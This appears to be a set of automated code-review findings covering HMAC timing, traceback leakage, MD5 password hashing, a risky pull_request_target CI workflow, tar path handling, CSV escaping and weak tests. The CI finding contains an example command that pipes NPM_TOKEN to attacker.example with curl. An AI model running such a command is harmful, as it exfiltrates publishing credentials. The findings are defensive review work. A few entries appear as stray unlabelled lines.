findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same kind of HMAC digest as `verify_stripe` but validates it with `expected == header`. Python's `str.__eq__` short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the signature an attacker guessed correctly, allowing a forged signature to be recovered byte-by-byte over repeated requests. The function two lines above (line 7) already does this correctly. Change line 12 to `return hmac.compare_digest(expected, header)`.

Secondary note while you are there: `compare_digest` raises `TypeError` if `header` is `None` or a `bytes`/`str` mismatch, whereas `==` silently returns `False`; if callers can pass a missing header, normalise it (e.g. `header or ""`) so the failure mode stays a clean `False`.

_Also raised by the security agent:_ verify_acmepay compares HMAC with `==` instead of compare_digest

findings.title: No test exercises verify_acmepay
findings.body: verify_acmepay is new behavior (webhook signature verification for a second provider) but no test file is included in this diff. If the comparison logic were wrong (e.g. accepting mismatched signatures), nothing would fail. Add a test asserting correct signatures verify and incorrect ones do not.

findings.title: Exception text and full traceback returned to the client on 500
findings.body:
`handle(exc)` previously returned a fixed `"internal error"` body; it now serialises `str(exc)` and `traceback.format_exc()` into the HTTP response. Any client that can provoke an unhandled exception — typically by sending malformed parameters, oversized values, or an unexpected content type — receives the stack frames, absolute source paths, module/dependency names and versions, the failing source lines, and whatever the exception message happens to embed. Database and driver exceptions are the worst case here: DB-API and ORM errors routinely include the failing SQL, table and column names, and connection parameters (host, port, user), and some driver errors echo the DSN itself.

That output is reconnaissance an unauthenticated attacker would otherwise have to guess at: it maps the internal file layout, reveals which libraries and versions are deployed (directly usable for picking a known CVE), and discloses schema details that make subsequent injection or IDOR attempts far cheaper.

Keep the client-facing body opaque and put the detail where on-call can already reach it. The `log.exception("request failed")` on line 8 is already emitting the full traceback to the logging backend, so the operational goal is met without the response change. If correlating a user report to a log line is the real need, return a generated identifier instead:

```python
def handle(exc):
    incident_id = uuid.uuid4().hex
    log.exception("request failed", extra={"incident_id": incident_id})
    return {"error": "internal error", "incident_id": incident_id}, 500
```

If verbose bodies are genuinely wanted for local work, gate them behind an explicit non-production setting that defaults to off, rather than returning them unconditionally.

_Also raised by the correctness agent:_ traceback.format_exc() yields "NoneType: None" outside an except block

_Also raised by the correctness agent:_ 500 response body shape changed: stable "error" string replaced, new key added

findings.title: No test covers the new error response contents
findings.body: The handle() function's return value changed from a generic error message to including str(exc) and a full traceback. There is no test in this diff verifying the response shape, and no existing test file was included to confirm this is already covered elsewhere. If this behavior is wrong (e.g. it should not leak internals), nothing would fail to signal that.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a password digest with a single unsalted MD5 pass, while `hash_password` immediately above uses bcrypt with a generated salt. MD5 is fast and unsalted here, so any stored value is recoverable by offline dictionary/rainbow-table attack at commodity GPU rates, and identical passwords produce identical digests across users.

Adversary: anyone who obtains read access to the stored digests — via SQL injection, a leaked backup or snapshot, a log sink, or an insider. What they control: nothing; possession of the table is enough. What they get: the users' plaintext passwords, which are typically reused on other services, plus the ability to complete the reset flow itself.

Fix: use the same primitive as the existing function — `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` (or argon2/scrypt) — and verify with `bcrypt.checkpw` so the comparison is also constant-time. If this value is actually a reset *token* rather than a password, it should be a `secrets.token_urlsafe` value hashed with SHA-256 and compared with `hmac.compare_digest`, not MD5 of a user-supplied string.

findings.title: Reset path emits MD5 digest incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt string (`$2b$...`), but `hash_reset_password` returns a 32-char MD5 hex digest. If both write to the same stored-password column, whatever verifies logins (presumably `bcrypt.checkpw`) will reject or raise on the MD5 value, so a user who completes a password reset cannot log in. Either route the reset flow through `hash_password` (bcrypt) so the stored format stays uniform, or, if a separate verification branch genuinely exists, make that explicit — and note that an unsalted MD5 is not an acceptable password hash regardless. No verification code was retrieved, so please confirm the caller side.

findings.title: New hashing/checksum functions have no tests
findings.body: hash_reset_password and checksum are new public functions with no accompanying tests in this diff. Nothing verifies their output format, error handling (e.g. missing file for checksum), or that hash_reset_password produces a stable, verifiable digest. If the implementation were changed or broken, no test would fail.

findings.title: pull_request_target runs untrusted fork code with NPM_TOKEN in env
findings.body:
`pull_request_target` runs the workflow in the context of the **base** repository: it has access to `secrets` and a `GITHUB_TOKEN` with write scope, and it is triggered automatically by anyone who opens a pull request from a fork. The checkout on lines 10-12 then deliberately pins `ref: ${{ github.event.pull_request.head.sha }}`, i.e. the attacker's commit, and line 13 executes `./scripts/measure.sh` **from that checkout** with `NPM_TOKEN` injected on lines 14-15.

Attacker: any GitHub user, no prior access required. What they control: the full contents of `scripts/measure.sh` (and anything it sources, plus package manifests/lifecycle scripts it may invoke) in their fork branch. What they get: arbitrary command execution in the base-repo job, so `echo $NPM_TOKEN | curl attacker.example -d @-` exfiltrates the publish token, and the ambient `GITHUB_TOKEN` can be used to push to the base repo or tamper with checks — all before a maintainer reviews anything.

Fixes, in order of preference:
1. Revert to `pull_request`. Forked PRs already run under that trigger with a read-only token and no secrets, which is precisely the isolation you want here; external contributors still get the CI signal, just without the token.
2. If the size check genuinely needs a registry credential, split it: a `pull_request` job that builds/measures untrusted code with no secrets, and a separate privileged job (`workflow_run` or `pull_request_target` checking out only the **base** ref) that consumes the artifact and never executes fork-controlled files.

Whichever way you go, do not combine `pull_request_target` + checkout of `head.sha` + execution of code from that checkout. Additionally, add an explicit `permissions:` block scoping `GITHUB_TOKEN` to the minimum (`contents: read`), since `pull_request_target` otherwise grants write access to the base repository.

_Also raised by the correctness agent:_ pull_request_target + head.sha checkout runs fork code with NPM_TOKEN

findings.title: json.dumps raises for contexts the old tuple key accepted
findings.body: The previous key `(template_source, tuple(sorted(context.items())))` only required context keys to be sortable and values to be hashable. `json.dumps` additionally requires every value to be JSON-encodable, so any existing caller passing a `datetime`, `Decimal`, `set`, tuple-keyed mapping, or a plain custom object in the context now gets a `TypeError` from the cache layer before `_render` is ever reached — a rendering call that used to succeed now fails outright. If arbitrary context objects are supported, pass `default=repr` (or a stable fallback) to `json.dumps`, or fall back to the old tuple key when serialisation fails.

findings.title: No test covers context values/keys that don't round-trip through JSON the same as Python equality
findings.body: The cache key generation changed from `tuple(sorted(context.items()))` (works for any hashable context) to `json.dumps([template_source, context], sort_keys=True)`. JSON serialization normalizes types in ways Python equality does not: non-string dict keys are coerced to strings (so context `{1: 'x'}` and `{'1': 'x'}` would collide and share a cache entry), and non-JSON-serializable values (tuples, sets, custom objects) will raise instead of caching. None of the new tests exercise these cases, so a regression here (e.g. accidental cache collisions between differently-typed keys) would pass silently.

findings.title: New name allowlist rejects inputs create_archive previously accepted
findings.body:
`create_archive` previously accepted any `name` and interpolated it into the command. It now raises `ValueError` unless the name matches `[A-Za-z0-9_-]{1,64}` in full. That excludes several shapes that are very ordinary for archive names and that the old code handled fine: dots (`backup.2024-01-01`, `db.dump`), spaces, subdirectory components (`tenants/acme`), and any name longer than 64 characters. Any existing caller passing such a name changes from a successful archive to an uncaught exception — a runtime break rather than a hardening no-op.

If `.` is legitimate for your callers, add it to the class while still excluding `/` and `..` (e.g. reject a name equal to `.`/`..` explicitly), and confirm the 64-character ceiling against the longest name actually produced today. If not, this at least needs a note in the changelog since it is a caller-visible contract narrowing.

findings.title: `directory` is unvalidated and controls what tar reads
findings.body:
`name` is now tightly allowlisted, but `directory` flows straight into the tar argv with no checks. Shell injection is correctly closed off (list argv, `shell=False`) and `--` stops it being read as an option, so the remaining exposure is content: whatever path is passed becomes the contents of `/exports/<name>.tar.gz`. If any caller lets a user influence `directory` — an export API taking a path or a project slug joined onto a root — that user gets `/etc`, `/root/.ssh`, or the app's config directory packaged into a file they can then download, i.e. arbitrary file read.

Suggested fix: resolve `directory` (`os.path.realpath`) and assert it is inside an expected export root before invoking tar, in the same place `name` is checked.

findings.title: test_runs_without_a_shell relies on an undefined `spy` fixture
findings.body:
`test_runs_without_a_shell` takes a `spy` fixture that is not defined anywhere in this diff and no `conftest.py` is added. If that fixture does not exist, the test errors at collection; if it exists but does not patch `subprocess.run`, the test actually forks `tar` and writes to `/exports/nightly.tar.gz`, which will fail on any machine where `/exports` is absent and makes the test non-hermetic.

Separately, the assertion reads `kwargs["shell"]`, which only holds because the call passes `shell=False` explicitly even though it is the default. Dropping that redundant kwarg later would turn this into a `KeyError` rather than a meaningful failure. Asserting on `args[0]` being a list (or that the first positional arg is a sequence, not a string) tests the actual property you care about and survives that refactor.

_Also raised by the tests agent:_ Test only checks mocked shell kwarg, not actual argv contents

findings.title: No test verifies the argv list content, including the `--` separator
findings.body: The change introduces list-form argv construction with a `--` separator specifically to stop a directory value from being interpreted as a tar option (e.g. a directory beginning with `-`). Neither test in test_archive.py verifies the actual contents of the argv list or exercises a directory value that would exploit missing `--` protection, so a regression that drops the `--` or misorders the args would go undetected.

findings.title: test_renders_empty_invoice contains no assertion
findings.body:
The test calls `render(Invoice(lines=[]))` and then ends. It passes for any return value — `None`, an empty string, a stack of garbage — and only fails if `render` raises. If the blank-invoice case is worth a test, assert the expected output (e.g. that the result is a string containing the header/zero total), otherwise the test gives false confidence that the empty path is covered. Compare with `test_renders_total` on line 2, which does assert on the returned value.

_Also raised by the tests agent:_ test_renders_empty_invoice has no assertion at all

findings.title: test_renders_line_items asserts only mock call_count, not actual output
findings.body:
The test mocks out format_line and only checks that it was called twice; it never checks what render() actually returns. If render() dropped the formatted lines, joined them incorrectly, or produced garbled output, this test would still pass as long as format_line got called twice. Assert on the actual rendered string content instead.

findings.title: Failing test deleted with no accompanying rounding fix in the diff
findings.body:
The PR is described as "Fix the rounding and drop the failing test", but the diff contains only the deletion of `test_rounds_half_to_even`; no production code is changed here. Either the implementation fix was omitted from this change (in which case the behaviour at the exact .5 boundary is still wrong and now silently so), or the behaviour intentionally changed and the test should have been *updated* to assert the new expected value rather than removed. Deleting it leaves `round_cents` with no coverage at all for the half-way boundary — the single case where rounding implementations differ — so a future regression between half-to-even and half-up will go undetected. Please either include the implementation change in this PR or restore the test with the corrected expectation (e.g. `round_cents(Decimal("2.345")) == Decimal("2.35")` if half-up is now intended).

_Also raised by the tests agent:_ Half-to-even rounding case deleted without replacement test

findings.title: Retry test patches wrong target; real `deliver` is invoked
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so the name `deliver` is bound into the `notify.sender` namespace at import time. Patching `notify.transport.deliver` rebinds the attribute on the *transport* module only; `send_with_retry` continues to call the original function object it captured. This test therefore exercises the real transport three times (possible network I/O, slowness, or flakiness) and only asserts `False` because the real `deliver` happened to return a falsy value — it would not catch a regression in the retry/give-up logic, and it would not catch a change from `attempts=3` to any other loop behaviour.

Patch the same target the passing test on line 2 already uses: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the call count equals 3 so the test actually pins the retry contract.

_Also raised by the tests agent:_ Mock patches wrong target; retry-exhaustion path is untested

findings.title: Test patch contradicts documented behavior
findings.body: The test patches `notify.transport.deliver`, but the docstring in `notify/sender.py` explicitly documents that `deliver` is bound into the module namespace at import time, making it necessary to patch `notify.sender.deliver` instead. This test will not exercise the retry path as intended because the patch does not affect the actual function call. The docstring is the contract that explains the correct patching strategy; this test contradicts it.

findings.title: csv_rows does not apply csv_escape, producing malformed CSV
findings.body: `csv_rows` stringifies each cell and joins with `,` without ever calling `csv_escape`, which is defined immediately below for exactly this purpose. Any cell whose value contains a comma or a double quote (e.g. `{"a": "Smith, John"}`) emits an extra field and shifts every subsequent column for that row, so the output no longer round-trips through any CSV reader. Change the comprehension to `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

findings.title: csv_rows joins raw values without using csv_escape
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never calls the `csv_escape` helper defined immediately below it. Any field value that contains a comma, a double quote, or a newline will be emitted unquoted, so the consumer of the CSV sees extra columns (or an extra record, for an embedded newline) that the producer never intended. If any part of `rows` originates from user-supplied report data — a name, a note, a URL — the supplier of that value controls the column layout of the output file and can forge values into adjacent columns of downstream imports.

Fix: apply the escaper in the join, e.g. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. While there, note that `csv_escape` also does not handle embedded newlines (a value with `\n` but no comma or quote is returned as-is and will split the record), and does not neutralise a leading `=`, `+`, `-` or `@`, which spreadsheet applications interpret as a formula. Using the stdlib `csv` module would cover the quoting cases correctly.

findings.title: csv_escape assumes str and ignores embedded newlines
findings.body: `csv_escape` calls `in` and `.replace` directly on `value`, so a non-string cell (int, None, date) raises `TypeError: argument of type 'int' is not iterable` rather than being escaped — relevant as soon as it is wired into `csv_rows`, whose cells come from arbitrary dicts. It also only tests for `,` and `"`; a value containing `\n` or `\r` must also be quoted or it splits the record across lines. Coerce with `value = str(value)` first and extend the condition to newline characters.

csv_rows and csv_escape are new public functions with non-trivial logic (column ordering, quote escaping) but no test covers them; the repo does have a precedent test for csv_header, so this is a real gap against the existing coverage standard.

findings.title: New test uses wall-clock time instead of a fixed now, weak assertion
findings.body:
Unlike test_token_expires_after_an_hour, which pins 'now' via an explicit timedelta so the expiry boundary is exercised deterministically, test_token_issued_today_is_valid calls is_expired(token.expires_at) with no now argument and compares issued_at.date() to datetime.now(timezone.utc).date(). This makes the test dependent on the real clock: it can flake around midnight UTC (issued_at computed just before midnight, comparison evaluated just after), and it never actually approaches the expiry boundary the PR claims to test — it will pass even if the expiry-window arithmetic is subtly wrong (e.g. off-by-one in the window calculation), since 'issued now' is far from any edge case.

_Also raised by the correctness agent:_ Test is time-dependent and will fail across the UTC midnight boundary

apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses a coupon expiring tomorrow, i.e. the happy path. findings.title: apply_coupon now requires a tz-aware coupon.expires_at on every caller
findings.body:
Line 9 unconditionally dereferences `coupon.expires_at` and compares it to an aware UTC datetime. Three reachable inputs fail badly rather than behaving as intended:

- A coupon object without the attribute (any caller or fixture predating this change) raises `AttributeError`, not `CouponExpired`.
- `expires_at is None` (a coupon that never expires is the natural encoding) raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'`.
- A naive `expires_at` (e.g. loaded from a DB column without timezone) raises `TypeError: can't compare offset-naive and offset-aware datetimes`.

The test edit on tests/test_coupons.py line 3 is direct evidence that `Coupon` was previously constructed without `expires_at`, so callers that still do exist. Guard the check, e.g. `if coupon.expires_at is not None and coupon.expires_at < now`, and normalise naive values to UTC before comparing — or make `expires_at` a required, always-aware field at the `Coupon` construction site so the failure is not deferred into billing.
